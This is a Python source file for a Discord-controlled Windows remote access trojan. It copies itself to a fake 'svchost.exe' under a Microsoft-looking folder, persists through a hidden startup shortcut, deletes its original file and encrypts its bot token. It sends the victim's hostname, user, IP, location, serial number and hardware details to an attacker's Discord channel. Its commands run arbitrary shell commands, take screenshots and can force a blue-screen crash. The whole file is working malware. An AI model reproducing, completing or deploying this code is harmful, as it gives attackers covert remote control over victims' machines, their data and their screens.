import os
import sys
import io
import time
import json
import shutil
import urllib.request
import subprocess
import random
import string
import socket
import platform
import getpass
import configparser
import logging
import ctypes
import traceback
import psutil
import winsound
import winreg
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from PIL import ImageGrab
from cryptography.fernet import Fernet
import discord
from discord.ext import commands

try:
    import win32com.client
except ImportError:
    win32com = None

DEBUG = False
appVersion = "1.0"
appBuild = "__MARKER_APP_BUILD__"

_K = b"__MARKER_TOKEN_KEY__"
_C = b"__MARKER_TOKEN_ENC__"

_TOKEN = ""
try:
    _TOKEN = Fernet(_K).decrypt(_C).decode()
except Exception:
    _TOKEN = ""

if len(sys.argv) > 1:
    args = sys.argv[1:]
    i = 0
    while i < len(args):
        arg = args[i]
        if arg in ("--build", "-b") and i + 1 < len(args):
            appBuild = args[i + 1]
            i += 2
        elif arg in ("--token", "-t") and i + 1 < len(args):
            _TOKEN = args[i + 1]
            i += 2
        elif arg.upper() == "DEBUG":
            appBuild = "DEBUG"
            DEBUG = True
            i += 1
        else:
            if i == 0:
                appBuild = arg
                if appBuild.upper() == "DEBUG":
                    DEBUG = True
            elif i == 1 and not _TOKEN:
                _TOKEN = arg
            i += 1

if appBuild.upper() == "DEBUG" or any(a.upper() == "DEBUG" for a in sys.argv[1:]):
    DEBUG = True

if DEBUG:
    if sys.platform == "win32" and getattr(sys, "frozen", False):
        try:
            ctypes.windll.kernel32.AllocConsole()
            sys.stdout = open("CONOUT$", "w", encoding="utf-8", buffering=1)
            sys.stderr = open("CONOUT$", "w", encoding="utf-8", buffering=1)
        except Exception:
            pass

logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="[%(asctime)s] [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger("bot")

GUILD_ID = 1530382256122761227
CATEGORY_ID = 1530382256865284126

def get_config_path():
    local_appdata = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
    folder = os.path.join(local_appdata, "Microsoft", "DeviceSync")
    os.makedirs(folder, exist_ok=True)
    filename = "sync_debug.ini" if DEBUG else "sync.ini"
    return os.path.join(folder, filename)

def get_target_exe():
    local_appdata = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
    folder = os.path.join(local_appdata, "Microsoft", "DeviceSync")
    os.makedirs(folder, exist_ok=True)
    return os.path.join(folder, "svchost.exe")

def load_config():
    path = get_config_path()
    if not os.path.exists(path):
        return None
    try:
        cp = configparser.ConfigParser()
        cp.read(path, encoding="utf-8")
        if "state" not in cp:
            os.remove(path)
            return None
        prefix = cp.get("state", "prefix", fallback="").strip()
        chid = cp.get("state", "chid", fallback="").strip()
        version = cp.get("state", "version", fallback="0.0").strip()
        build = cp.get("state", "build", fallback="").strip()
        if not prefix or not prefix.isalpha() or not prefix.islower() or not (2 <= len(prefix) <= 4):
            os.remove(path)
            return None
        return {"prefix": prefix, "chid": chid, "version": version, "build": build}
    except Exception as e:
        logger.error(f"Failed to load config file '{path}': {e}")
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                pass
        return None

def save_config(prefix, chid="", version="1.0", build=""):
    path = get_config_path()
    cp = configparser.ConfigParser()
    cp["state"] = {
        "prefix": prefix,
        "chid": chid,
        "version": version,
        "build": build
    }
    with open(path, "w", encoding="utf-8") as f:
        cp.write(f)
    logger.info(f"Saved configuration to '{path}'")

def ensure_startup_shortcut(target_exe):
    try:
        if not win32com:
            return
        appdata = os.environ.get("APPDATA")
        if not appdata:
            return
        startup_dir = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir, exist_ok=True)
        shortcut_path = os.path.join(startup_dir, "WindowsDeviceSync.lnk")
        shell = win32com.client.Dispatch("WScript.Shell")
        if os.path.exists(shortcut_path):
            try:
                existing_lnk = shell.CreateShortcut(shortcut_path)
                if os.path.normpath(existing_lnk.TargetPath) == os.path.normpath(target_exe):
                    return
            except Exception:
                pass
        lnk = shell.CreateShortcut(shortcut_path)
        lnk.TargetPath = target_exe
        lnk.WorkingDirectory = os.path.dirname(target_exe)
        lnk.WindowStyle = 7
        lnk.Save()
    except Exception as e:
        logger.error(f"Failed to ensure startup shortcut: {e}")

def kill_existing_instances(target_exe):
    my_pid = os.getpid()
    target_norm = os.path.normpath(target_exe).lower()
    for proc in psutil.process_iter(['pid', 'exe']):
        try:
            info_exe = proc.info.get('exe')
            if proc.info['pid'] != my_pid and info_exe:
                if os.path.normpath(info_exe).lower() == target_norm:
                    proc.kill()
        except Exception:
            pass

def spawn_detached(target_exe):
    try:
        if os.name == "nt":
            flags = 0x00000008 | 0x00000200
            subprocess.Popen([target_exe], creationflags=flags, close_fds=True)
        else:
            subprocess.Popen([target_exe])
    except Exception as e:
        logger.error(f"Failed to spawn detached process: {e}")

def generate_prefix():
    length = random.randint(2, 4)
    return "".join(random.choices(string.ascii_lowercase, k=length))

def query_wmi(query, attrs):
    try:
        if win32com:
            wmi = win32com.client.GetObject("winmgmts:")
            items = wmi.ExecQuery(query)
            for item in items:
                parts = []
                for a in attrs:
                    val = getattr(item, a, None)
                    if val is not None:
                        parts.append(str(val).strip())
                if parts:
                    return " - ".join(parts)
    except Exception:
        pass
    return "N/A"

def get_flag_emoji(country_code):
    try:
        if country_code and len(country_code) == 2 and country_code.isalpha():
            return chr(127397 + ord(country_code[0].upper())) + chr(127397 + ord(country_code[1].upper()))
    except Exception:
        pass
    return ""

def get_public_ip_and_location():
    pub_ip = "N/A"
    location = "N/A"
    try:
        req = urllib.request.Request("http://ip-api.com/json/", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            if data.get("status") == "success":
                pub_ip = data.get("query", "N/A")
                city = data.get("city", "")
                country_code = data.get("countryCode", "")
                flag = get_flag_emoji(country_code)
                loc_parts = [p for p in [city, country_code] if p]
                loc_str = ", ".join(loc_parts)
                if flag:
                    loc_str += f" {flag}"
                location = loc_str if loc_str else "N/A"
    except Exception:
        pass

    if pub_ip == "N/A":
        try:
            req = urllib.request.Request("https://api.ipify.org?format=json", headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                pub_ip = data.get("ip", "N/A")
        except Exception:
            pass

    return pub_ip, location

def get_sys_info(prefix_str):
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "N/A"
    try:
        user = getpass.getuser()
    except Exception:
        user = "N/A"
    try:
        ver = platform.version()
        parts = ver.split(".")
        major = int(parts[0]) if len(parts) > 0 else 0
        build = int(parts[2]) if len(parts) > 2 else 0
        if major == 6:
            friendly = "Windows 8"
        elif major == 10 and build >= 22000:
            friendly = "Windows 11"
        elif major == 10:
            friendly = "Windows 10"
        else:
            friendly = "Windows"
        os_info = f"{platform.system()} ({friendly}) {ver}"
    except Exception:
        os_info = f"{platform.system()} {platform.version()}"

    v6_list = []
    try:
        net_addrs = psutil.net_if_addrs()
        for iface, addrs in net_addrs.items():
            for addr in addrs:
                if addr.family == socket.AF_INET6:
                    ip = addr.address
                    if ip != "::1" and not ip.lower().startswith("fe80"):
                        v6_list.append(ip)
    except Exception:
        pass
    v6_str = ", ".join(v6_list) if v6_list else "N/A"

    pub_ip, location = get_public_ip_and_location()

    serial_no = query_wmi("SELECT SerialNumber FROM Win32_BIOS", ["SerialNumber"])
    mfg_model = query_wmi("SELECT Manufacturer, Model FROM Win32_ComputerSystem", ["Manufacturer", "Model"])
    cpu_info = query_wmi("SELECT Name, NumberOfCores, MaxClockSpeed FROM Win32_Processor", ["Name", "NumberOfCores", "MaxClockSpeed"])

    try:
        ram_total = psutil.virtual_memory().total / (1024 ** 3)
        ram_str = f"{ram_total:.2f} GiB"
    except Exception:
        ram_str = "N/A"

    try:
        drive_path = "C:\\" if os.name == "nt" else "/"
        usage = psutil.disk_usage(drive_path)
        t_gib = usage.total / (1024 ** 3)
        u_gib = usage.used / (1024 ** 3)
        f_gib = usage.free / (1024 ** 3)
        disk_str = f"{t_gib:.2f} GiB Total / {u_gib:.2f} GiB Used / {f_gib:.2f} GiB Free"
    except Exception:
        disk_str = "N/A"

    embed = discord.Embed(title="System Information", color=0x2b2d31)
    embed.add_field(name="Hostname", value=hostname, inline=True)
    embed.add_field(name="Current User", value=user, inline=True)
    embed.add_field(name="Operating System", value=os_info, inline=False)
    embed.add_field(name="Public IPv4", value=pub_ip, inline=True)
    embed.add_field(name="Location", value=location, inline=True)
    embed.add_field(name="IPv6", value=v6_str, inline=True)
    embed.add_field(name="Serial Number", value=serial_no, inline=True)
    embed.add_field(name="Manufacturer & Model", value=mfg_model, inline=True)
    embed.add_field(name="CPU", value=cpu_info, inline=False)
    embed.add_field(name="RAM", value=ram_str, inline=True)
    embed.add_field(name="Disk", value=disk_str, inline=True)
    embed.add_field(name="Prefix", value=f"{prefix_str}!", inline=True)
    embed.add_field(name="App Version", value=appVersion, inline=True)
    embed.add_field(name="App Build", value=appBuild, inline=True)
    return embed

def create_online_embed(prefix_str):
    return discord.Embed(
        title="Machine Online",
        description=f"Prefix: {prefix_str}!",
        color=0x57f287,
        timestamp=discord.utils.utcnow()
    )

def get_prefix_callable(bot, message):
    cfg = load_config()
    p = cfg["prefix"] if cfg else "bot"
    return p + "!"

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix=get_prefix_callable, intents=intents, help_command=None)

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    cfg = load_config()
    if not cfg:
        return
    if str(message.channel.id) != cfg.get("chid", ""):
        return
    logger.info(f"Received command: '{message.content}' from {message.author}")
    await bot.process_commands(message)

@bot.command(name="help")
async def cmd_help(ctx):
    cfg = load_config()
    p = (cfg["prefix"] if cfg else "bot") + "!"
    embed = discord.Embed(title="Available Commands", color=0x2b2d31)
    embed.add_field(name=f"{p}help", value="Show this help message", inline=False)
    embed.add_field(name=f"{p}ss", value="Capture and send a screenshot of the screen", inline=False)
    embed.add_field(name=f"{p}ping", value="Check bot responsiveness", inline=False)
    embed.add_field(name=f"{p}lock", value="Lock the workstation", inline=False)
    embed.add_field(name=f"{p}beep", value="Play a beep sound", inline=False)
    embed.add_field(name=f"{p}admincheck", value="Check if the current user has administrator privileges", inline=False)
    embed.add_field(name=f"{p}bsod", value="Trigger a Blue Screen of Death (BSOD)", inline=False)
    embed.add_field(name=f"{p}cmd <command>", value="Execute a shell command and return the output [EXPERIMENTAL]", inline=False)
    embed.add_field(name=f"{p}sysinfo", value="Display system information details", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="ss")
async def cmd_ss(ctx):
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        file = discord.File(fp=buf, filename="screenshot.png")
        await ctx.send(file=file)
    except Exception as e:
        logger.error(f"Failed to capture screenshot: {e}")
        await ctx.send("Failed to capture screenshot.")

@bot.command(name="ping")
async def cmd_ping(ctx):
    await ctx.send("Pong!")

@bot.command(name="lock")
async def cmd_lock(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()
        await ctx.send("Workstation locked.")
    except Exception as e:
        logger.error(f"Failed to lock workstation: {e}")
        await ctx.send("Failed to lock workstation.")


@bot.command(name="beep")
async def cmd_beep(ctx):
    try:
        winsound.Beep(1000, 500)
        await ctx.send("Beep sound played.")
    except Exception as e:
        logger.error(f"Failed to play beep sound: {e}")
        await ctx.send("Failed to play beep sound.")


@bot.command(name="admincheck")
async def cmd_admincheck(ctx):
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        await ctx.send(f"Administrator privileges: {'Yes' if is_admin else 'No'}")
    except Exception as e:
        logger.error(f"Failed to check admin privileges: {e}")
        await ctx.send("Failed to check admin privileges.")

@bot.command(name="bsod")
async def cmd_bsod(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except Exception as e:
        logger.error(f"Failed to trigger BSOD: {e}")
        await ctx.send("Failed to trigger BSOD.")

@bot.command(name="cmd")
async def cmd_cmd(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        output = result.stdout.strip() + "\n" + result.stderr.strip()
        output = output.strip() or "No output."
        if len(output) > 1900:
            output = output[:1900] + "\n...[truncated]"
        await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        logger.error(f"Failed to execute command '{command}': {e}")
        await ctx.send(f"Failed to execute command: {e}")

@bot.command(name="sysinfo")
async def cmd_sysinfo(ctx):
    cfg = load_config()
    p = cfg["prefix"] if cfg else "bot"
    embed = get_sys_info(p)
    await ctx.send(embed=embed)

_boot_completed = False

@bot.event
async def on_ready():
    global _boot_completed
    if _boot_completed:
        return
    _boot_completed = True

    logger.info(f"Bot online as {bot.user} (ID: {bot.user.id}) | DEBUG={DEBUG} | Build={appBuild}")

    cfg = load_config()
    is_new = False
    if not cfg:
        prefix_val = generate_prefix()
        save_config(prefix_val, "", appVersion, appBuild)
        cfg = {"prefix": prefix_val, "chid": "", "version": appVersion, "build": appBuild}
        is_new = True
        logger.info(f"Created new configuration file '{get_config_path()}' with prefix '{prefix_val}'")
    else:
        prefix_val = cfg["prefix"]
        logger.info(f"Loaded existing configuration file '{get_config_path()}' with prefix '{prefix_val}'")

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        try:
            guild = await bot.fetch_guild(GUILD_ID)
        except Exception as e:
            logger.error(f"Failed to fetch guild {GUILD_ID}: {e}")
            guild = None

    if not guild:
        logger.error("Guild not found!")
        return

    category = guild.get_channel(CATEGORY_ID)
    if not category:
        try:
            category = await bot.fetch_channel(CATEGORY_ID)
        except Exception as e:
            logger.warning(f"Category {CATEGORY_ID} not found: {e}")
            category = None

    channel = None
    chid_str = cfg.get("chid", "")
    if chid_str and not is_new:
        try:
            channel = bot.get_channel(int(chid_str))
            if not channel:
                channel = await bot.fetch_channel(int(chid_str))
        except Exception as e:
            logger.warning(f"Could not fetch channel ID {chid_str}: {e}")
            channel = None

    if not channel:
        try:
            logger.info(f"Creating new Discord text channel for prefix '{prefix_val}'...")
            if category and hasattr(category, "create_text_channel"):
                channel = await category.create_text_channel(name=prefix_val)
            else:
                channel = await guild.create_text_channel(name=prefix_val, category=category)
            save_config(prefix_val, str(channel.id), appVersion, appBuild)
            logger.info(f"Created channel '{prefix_val}' with ID {channel.id}")
            embed = get_sys_info(prefix_val)
            await channel.send(embed=embed)
        except Exception as e:
            logger.error(f"Failed to create Discord text channel: {e}")
    else:
        try:
            logger.info(f"Using Discord text channel ID {channel.id}")
            embed = create_online_embed(prefix_val)
            await channel.send(embed=embed)
        except Exception as e:
            logger.error(f"Failed to send online notification to channel: {e}")

    if getattr(sys, 'frozen', False) and not DEBUG:
        target_exe = get_target_exe()
        current_exe = os.path.abspath(sys.executable)
        target_norm = os.path.normpath(target_exe).lower()
        current_norm = os.path.normpath(current_exe).lower()

        if current_norm != target_norm:
            logger.info("Self-copying executable to target path...")
            kill_existing_instances(target_exe)
            time.sleep(0.5)
            copied = False
            for _ in range(5):
                try:
                    shutil.copy2(current_exe, target_exe)
                    copied = True
                    break
                except Exception:
                    time.sleep(0.5)
            if copied:
                ensure_startup_shortcut(target_exe)
                if os.name == "nt":
                    subprocess.Popen(f'cmd.exe /c timeout /t 2 /nobreak & del /f /q "{current_exe}"', shell=True)
                spawn_detached(target_exe)
                await bot.close()
                sys.exit(0)
        else:
            ensure_startup_shortcut(target_exe)
    elif DEBUG:
        logger.info("DEBUG mode active: Skipping self-copying, self-deletion, and startup shortcut persistence.")

try:
    if not _TOKEN:
        logger.error("NO DISCORD BOT TOKEN PROVIDED! Pass it via CLI or embed it during build.")
    else:
        logger.info("Starting bot execution...")
        bot.run(_TOKEN)
except Exception as e:
    logger.error(f"Bot execution error: {e}")
    traceback.print_exc()
finally:
    if DEBUG:
        print("\n" + "=" * 50)
        print("DEBUG MODE: Bot execution has ended. You can close this window or press Ctrl+C to exit.")
        print("To close, manually close this terminal window.")
        print("=" * 50)
        while True:
            try:
                time.sleep(3600)
            except KeyboardInterrupt:
                break
            except Exception:
                pass


